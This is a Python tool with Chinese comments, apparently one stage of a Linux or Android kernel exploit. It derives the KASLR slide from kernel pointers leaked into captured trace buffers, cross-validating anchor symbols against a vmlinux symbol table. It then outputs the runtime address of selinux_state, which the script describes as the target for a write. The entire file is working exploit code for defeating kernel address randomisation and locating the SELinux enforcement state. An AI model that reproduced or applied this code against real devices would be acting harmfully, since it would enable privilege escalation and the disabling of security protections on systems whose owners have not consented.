#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""resolve_slide.py — 严格版 KASLR slide 推导（多锚点交叉验证 + 符号映射自检）

与仓库自带的 tools/slide_now.py 的区别：
  * 只输出机器可读结果，便于脚本解析；
  * 强制要求「至少 N 个不同锚点指向同一个 slide」；
  * 额外做一次正向自检：把观测值减 slide 后必须落回已知函数且偏移在函数大小内，
    命中数不足就判定失败，避免 slide_now.py 出现过的「众数选错」。

用法:
  resolve_slide.py <抓包目录> --vmlinux <vmlinux.elf> [--min-anchors 3] [--min-verify 6]

成功时 stdout:
  SLIDE=0x1a4d800000
  TEXT=0xffffffdacd800000
  SELINUX_STATE=0xffffffdad0118630
  ANCHORS=3 HITS=41 VERIFY=9/12
  ANCHOR worker_thread+0x260 -> 0xffffffdacd9270c0
  ...
退出码 0 成功，1 失败（原因写到 stderr）。
"""
import argparse
import bisect
import collections
import glob
import os
import re
import struct
import sys

TEXT_LO, TEXT_HI = 0xFFFFFF8000000000, 0xFFFFFFF000000000
SLIDE_MAX = 1 << 42
SLIDE_ALIGN = 0x200000
CALLER_RE = re.compile(r"caller=([A-Za-z_][A-Za-z0-9_.]*)\+0x([0-9a-fA-F]+)/0x([0-9a-fA-F]+)")


def load_elf(path):
    from elftools.elf.elffile import ELFFile
    if not os.path.exists(path):
        sys.exit("vmlinux 不存在: %s" % path)
    e = ELFFile(open(path, "rb"))
    funcs, objs = {}, {}
    for sec in e.iter_sections():
        if not sec.name.startswith(".symtab"):
            continue
        for s in sec.iter_symbols():
            try:
                nm, val, typ = s.name, s["st_value"], s["st_info"]["type"]
                size = s["st_size"]
            except KeyError:
                continue
            if not nm or not val:
                continue
            if typ == "STT_FUNC":
                funcs.setdefault(nm, (val, size or 0))
            elif typ == "STT_OBJECT":
                objs.setdefault(nm, (val, size or 0))
    if not funcs:
        sys.exit("vmlinux 里没有 STT_FUNC 符号，文件可能不对")
    ent = sorted((a, n, sz) for n, (a, sz) in funcs.items())
    return funcs, objs, ent


def observed(d):
    files = sorted(glob.glob(os.path.join(d, "bl_*.bin")))
    if not files:
        sys.exit("目录里没有 bl_*.bin: %s" % d)
    obs = collections.Counter()
    unpack = struct.unpack_from
    for p in files:
        data = open(p, "rb").read()
        n = len(data) - 8
        for i in range(n):
            v = unpack("<Q", data, i)[0]
            if TEXT_LO <= v < TEXT_HI:
                obs[v] += 1
    return obs


def text_anchors(d, limit=12):
    p = os.path.join(d, "bl_text.txt")
    if not os.path.exists(p):
        return []
    cnt = collections.Counter()
    for line in open(p, encoding="utf-8", errors="replace"):
        tail = line.split("caller=")[-1][:60]
        if "[" in tail:          # [module] 里的符号 vmlinux 没有，跳过
            continue
        m = CALLER_RE.search(line)
        if m:
            cnt[(m.group(1), int(m.group(2), 16))] += 1
    return [k for k, _ in cnt.most_common(limit)]


def vote(obs, anchors, funcs):
    votes = collections.Counter()
    per_slide = collections.defaultdict(set)
    for v, _ in obs.most_common(24):
        for name, off in anchors:
            got = funcs.get(name)
            if not got:
                continue
            s = v - got[0] - off
            if 0 <= s < SLIDE_MAX and s % SLIDE_ALIGN == 0:
                votes[s] += 1
                per_slide[s].add((name, off))
    return votes, per_slide


def map_one(addr_ent, val):
    i = bisect.bisect_right(addr_ent, (val, "\xff", 1 << 62)) - 1
    if i < 0:
        return None
    a, n, sz = addr_ent[i]
    off = val - a
    if sz and off >= sz:
        return None
    return n, off, sz


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("dir")
    ap.add_argument("--vmlinux", required=True)
    ap.add_argument("--min-anchors", type=int, default=3)
    ap.add_argument("--min-verify", type=int, default=6)
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args(argv)

    funcs, objs, ent = load_elf(a.vmlinux)
    obs = observed(a.dir)
    if not obs:
        sys.exit("抓包里没有内核文本区间内的值，perfetto 可能没抓到")
    anchors = text_anchors(a.dir)
    if not anchors:
        sys.exit("缺少 bl_text.txt 或解析不到锚点，无法交叉验证（拒绝用启发式猜测）")

    votes, per_slide = vote(obs, anchors, funcs)
    if not votes:
        sys.exit("没有任何 (观测值, 锚点) 组合能解出对齐的 slide")

    slide, hits = votes.most_common(1)[0]
    distinct = per_slide[slide]
    if hits < 3 or len(distinct) < a.min_anchors:
        sys.exit("锚点不足：hits=%d distinct=%d（要求 distinct>=%d）"
                 % (hits, len(distinct), a.min_anchors))

    # 正向自检：观测值 - slide 必须落回真实函数
    ok, tot = 0, 0
    for v, _ in obs.most_common(12):
        tot += 1
        if map_one(ent, v - slide):
            ok += 1
    if ok < a.min_verify:
        sys.exit("正向自检失败：%d/%d 落回已知函数（要求>=%d），slide 不可信"
                 % (ok, tot, a.min_verify))

    st = objs.get("selinux_state")
    if not st:
        sys.exit("vmlinux 里没有 selinux_state 符号，无法给出写入地址")

    print("SLIDE=0x%x" % slide)
    print("TEXT=0x%x" % (funcs["_text"][0] + slide if "_text" in funcs else 0))
    print("SELINUX_STATE=0x%x" % (st[0] + slide))
    print("ANCHORS=%d HITS=%d VERIFY=%d/%d" % (len(distinct), hits, ok, tot))
    if not a.quiet:
        for name, off in sorted(distinct):
            v = funcs[name][0] + off + slide
            print("ANCHOR %s+0x%x -> 0x%x" % (name, off, v))
    return 0


if __name__ == "__main__":
    sys.exit(main())
